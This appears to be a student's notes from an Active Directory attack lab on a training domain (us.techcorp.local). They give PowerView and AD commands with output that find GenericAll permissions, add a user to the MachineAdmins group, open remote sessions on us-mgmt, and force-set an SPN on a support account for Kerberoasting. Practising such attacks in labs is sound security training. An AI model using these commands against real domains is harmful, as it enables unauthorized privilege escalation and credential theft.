### GenericWrite 
```
function Get-ADPrincipalGroupMembershipRecursive ($SamAccountName)
{
   $groups = @(Get-ADPrincipalGroupMembership -Identity $SamAccountName | select -ExpandProperty distinguishedname)
   $groups
   if ($groups.count -gt 0)
   {
        foreach ($group in $groups)
        {
            Get-ADPrincipalGroupMembershipRecursive $group
        }
    }
}
Get-ADPrincipalGroupMembershipRecursive 'studentuser137'

```
```
Find-InterestingDomainAcl -ResolveGUIDs |?{$_.IdentityReferenceName -match 'managers'}
```

us\managers group have GenericAll interesting permissions to MachineAdmins . 
```
ObjectDN                : CN=MachineAdmins,OU=Mgmt,DC=us,DC=techcorp,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : GenericAll
ObjectAceType           : All
AceFlags                : ContainerInherit, Inherited
AceType                 : AccessAllowedObject
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-210670787-2521448726-163245708-1117
IdentityReferenceName   : managers
IdentityReferenceDomain : us.techcorp.local
IdentityReferenceDN     : CN=Managers,CN=Users,DC=us,DC=techcorp,DC=local
IdentityReferenceClass  : group

```
```
Get-DomainObjectAcl -Identity machineadmins -ResolveGUIDs | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match 'managers'}
```
```
Add-ADGroupMember -Identity MachineAdmins -Members studentuserx -Verbose

```
```
Get-ADComputer –Filter * | select –expand name
winrs -r:us-mgmt cmd
$usmgmt = New-PSSession us-mgmt
Enter-PSSession $usmgmt
```
***studentuserX has GenericAll rights on the supportXuser, let’s force set a SPN on it***

```
Find-InterestingDomainAcl -ResolveGUIDs |?{$_.IdentityReferenceName -match "StudentUsers"}

ObjectDN                : CN=Support147User,CN=Users,DC=us,DC=techcorp,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : GenericAll
ObjectAceType           : None
AceFlags                : None
AceType                 : AccessAllowed
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-210670787-2521448726-163245708-1116
IdentityReferenceName   : studentusers
IdentityReferenceDomain : us.techcorp.local
IdentityReferenceDN     : CN=StudentUsers,CN=Users,DC=us,DC=techcorp,DC=local
IdentityReferenceClass  : group
```
```
Get-ADUser -Identity support148user -Properties ServicePrincipalName | select ServicePrincipalName
Set-DomainObject -Identity support148user -Set @{serviceprincipalname='us/myspn148'} -Verbose
```
